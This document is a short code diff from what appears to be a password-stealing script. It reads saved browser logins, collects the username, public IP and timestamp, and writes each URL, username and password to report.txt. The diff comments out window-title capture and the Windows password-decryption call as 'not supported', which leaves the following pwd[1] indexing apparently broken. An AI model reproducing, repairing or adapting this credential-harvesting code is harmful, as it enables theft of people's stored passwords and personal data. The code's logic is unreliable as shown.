@@ -87,13 +87,13 @@ def get_bytes():
   string = ''
 	
   # displays current window opened as they ran the script
-  string += 'Window: ' + win32gui.GetWindowText(win32gui.GetForegroundWindow()) + '\n'
+  #string += 'Window: ' + win32gui.GetWindowText(win32gui.GetForegroundWindow()) + '\n' // not supported
   # writes user data to .txt file
   string += 'Date/Time: ' + datetime + '\nUsername: ' + user + '\nPublic IP: ' + publicIP + '\n'
  
   # writing passwords to a .txt file
   for url, user_name, pwd in login_data:
-      pwd = win32crypt.CryptUnprotectData(pwd)
+      #pwd = win32crypt.CryptUnprotectData(pwd) // not supported
       cred[url] = (user_name, pwd[1].decode('utf8'))
       string += '\n[+] URL:%s USERNAME:%s PASSWORD:%s\n' % (url,user_name,pwd[1].decode('utf8'))
       with open('report.txt', 'w') as fp:
